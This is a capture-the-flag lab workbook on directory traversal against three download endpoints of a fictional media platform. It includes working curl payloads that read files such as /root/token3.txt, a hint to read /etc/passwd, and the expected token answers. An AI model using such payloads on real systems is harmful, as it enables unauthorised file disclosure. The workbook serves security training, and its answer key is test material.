# Cascade Digital Media - Traversal Scavenger Hunt

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `web-1-8-traversal-scavenger-hunt/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Cascade Digital Media - Traversal Scavenger Hunt** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **40 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Cascade Digital Media operates a content management platform used by their
marketing and engineering teams. The platform provides media downloads,
internal documentation, and report exports through three separate endpoints.

Jordan Blake (VP of Engineering) authorized a focused security assessment:
"We built these download features quickly for different teams. Each one was
developed independently, so they may have inconsistent security controls.
We need to know if any of them can be abused before our ISO 27001 audit."

The platform is running at http://<target>. Three assessment tokens have been
hidden in different locations on the server filesystem. Find all three tokens
and assemble the flag in the format OCR{token1_token2_token3}.

## Your Objectives

- Identify multiple file download endpoints across a web application
- Exploit directory traversal vulnerabilities with varying directory depths
- Discover hidden token files placed in non-standard filesystem locations
- Combine multiple fragments to assemble a complete flag
- Understand how path traversal depth varies depending on the application root

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**Web application responds**

```bash
curl -s -o /dev/null -w '%{http_code}' http://<target>/
```

Expected: `200`

**Extract token 1 via /media/download traversal**

```bash
curl -s 'http://<target>/media/download?asset=../../../opt/cascade/token1.txt'
```

Expected: `sc4v3ng3`

**Extract token 2 via /docs/fetch traversal**

```bash
curl -s 'http://<target>/docs/fetch?doc=../../var/cascade/token2.txt'
```

Expected: `p4th`

**Extract token 3 via /api/export traversal**

```bash
curl -s 'http://<target>/api/export?report=../../../root/token3.txt'
```

Expected: `pwn`

**Assemble and verify complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{`


### Hint ladder

<details><summary>Hint 1 (unlocks after 15 minutes)</summary>

The application has three distinct download endpoints: /media/download,
/docs/fetch, and /api/export. Each uses a different query parameter
(asset, doc, report). Browse the site to find all three sections and
examine how each download feature constructs its file path.

</details>

<details><summary>Hint 2 (unlocks after 25 minutes)</summary>

Each endpoint serves files from a different base directory on the server.
The number of ../ sequences needed depends on how deep that base directory
is in the filesystem. Try reading /etc/passwd first to confirm traversal
works, then hunt for token files in /opt, /var, and /root.

</details>

<details><summary>Hint 3 (unlocks after 35 minutes)</summary>

Token 1 is accessed via the /media/download endpoint - traverse up to
reach /opt/cascade/token1.txt. Token 2 is via /docs/fetch - traverse
to /var/cascade/token2.txt. Token 3 is via /api/export - traverse to
/root/token3.txt. Combine them as OCR{token1_token2_token3}.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Validate and encode input at the server, enforce authorization on every object, and monitor unusual request patterns.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
